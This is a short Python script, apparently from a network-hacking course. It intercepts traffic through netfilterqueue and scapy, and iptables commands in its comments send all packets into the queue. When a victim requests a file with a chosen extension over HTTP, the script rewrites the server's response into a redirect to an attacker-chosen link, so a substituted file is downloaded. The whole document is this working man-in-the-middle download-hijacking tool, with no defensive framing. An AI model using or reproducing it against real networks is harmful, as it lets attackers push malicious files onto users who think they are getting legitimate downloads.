#!/usr/bin/python3
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I FORWARD -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy.all as scapy
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--type", dest="typeOfFile", help="The type of file that is substituted when downloading")
parser.add_argument("-r", "--redirect", dest="link", help="Link to the file that will actually be downloaded")
options = parser.parse_args()

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if "." + options.typeOfFile in scapy_packet[scapy.Raw].load:
                print(options.typeOfFile + "Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('Replacing files')
                modified_packet = set_load(scapy_packet,
                                           "HTTP/1.1 301 Moved Permanently\nLocation: " + options.link + "\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()